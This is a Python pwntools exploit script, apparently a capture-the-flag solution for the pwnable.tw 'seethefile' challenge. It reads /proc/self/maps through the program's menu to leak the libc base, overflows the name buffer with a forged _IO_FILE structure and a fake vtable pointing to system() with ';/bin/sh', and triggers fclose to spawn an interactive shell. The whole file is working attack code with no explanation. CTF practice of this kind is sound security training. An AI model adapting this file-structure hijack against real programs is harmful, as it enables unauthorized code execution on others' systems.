from pwn import *

def fopen(fname):
#	p.sendlineafter('Your choice :', '1')
#	p.sendlineafter("What do you want to see :", str(fname))
	p.recv()
	p.sendline('1')
	p.sendline(str(fname))

def read():
	p.sendlineafter('Your choice :', '2')

def write():
	p.sendlineafter('Your choice :', '3')

def close():
	p.sendlineafter('Your choice :', '4')


p = process('./seethefile')
#p = remote('chall.pwnable.tw', 10200)
e = ELF("./seethefile")
l = e.libc
#l = ELF('libc_32.so.6')

pause()
context.log_level = "debug"

struct_start = 0x0804B284
vtable = struct_start + 0x94 + 4
main = 0x8048A37

###libc leak
fopen('/proc/self/maps')
read()
write()
p.recvuntil('r-xp')

read()
write()
libc = int(p.recvuntil('r-xp').split(' ')[-2].strip()[:8],16)
log.info('libc : ' + hex(libc))
log.info('system ' + hex(libc + l.sym['system']))
############

### write fake _IO_FILS_plus 
log.info('FAKE FILE start : ' + hex(struct_start))
log.info('vtable : ' + hex(vtable))
log.info('offset : ' + hex(l.sym['puts']))

payload = 'a' * 0x20
payload += p32(struct_start)

struct = p32(0xffffffff)
struct += ';/bin/sh\x00'
struct = struct.ljust(0x94,'\x00')
struct += p32(struct_start + 0x94 + 4)

vtable = p32(0) *2
vtable += p32(libc + l.sym['system'])
vtable = vtable.ljust(0x44,'\x00')
vtable += p32(libc + l.sym['system'])

struct += vtable
payload += struct
#######################

### triger fclose -> get shell!
p.sendlineafter('Your choice :', str(5))
pause()
p.sendlineafter('Leave your name :', payload)
##############################

p.interactive()
